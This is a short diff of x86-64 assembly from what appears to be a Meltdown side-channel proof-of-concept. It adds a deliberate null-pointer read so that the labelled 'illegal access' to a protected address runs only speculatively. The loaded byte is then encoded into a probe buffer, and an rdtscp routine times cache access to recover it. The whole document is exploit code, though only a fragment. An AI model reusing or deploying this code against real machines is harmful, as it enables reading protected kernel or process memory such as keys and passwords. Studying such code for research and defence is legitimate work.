@@ -17,7 +17,7 @@ measure_access_time:
     rdtscp
     mov %rax, %rbx
 
-    // deref memory at rdi (rdi is ptr param) 
+    // Deref memory at rdi (rdi is ptr param) 
     mov (%rdi), %rdi
 
     // rax = cur_tsc - rbx
@@ -34,7 +34,10 @@ do_access:
     push %rdi
     push %rsi
 
-    // do access (rsi is ptr param)
+    // Cause an exception now. This will make the code below happen only speculatively
+    movb (0x0), %al
+
+    // Do the Meltdown illegal access (rsi is ptr param)
     movb (%rsi), %bl
     shl $0xc, %rbx
     // rdi is our_buffer param
